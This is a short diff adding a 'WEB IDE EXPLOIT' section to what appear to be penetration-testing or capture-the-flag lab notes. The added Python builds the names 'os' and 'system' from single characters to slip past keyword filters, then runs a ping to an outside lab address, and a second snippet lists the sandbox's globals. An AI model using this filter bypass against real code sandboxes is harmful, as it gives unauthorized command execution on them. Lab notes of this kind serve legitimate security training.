@@ -525,3 +525,24 @@ module_dirs:
 modules:
   - systeminfo_enum
 ```
+
+***
+
+## WEB IDE EXPLOIT
+
+```
+module_name = 'o' + 's'
+method_name = 's' + 'y' + 's' + 't' + 'e' + 'm'
+module = sys.modules[module_name]
+method = getattr(module, method_name)
+method('ping -c 3 10.10.14.106')
+```
+
+```
+
+for name, obj in globals().items():
+    try:
+        print(f"{name}: {type(obj)}")
+    except Exception:
+        pass
+```
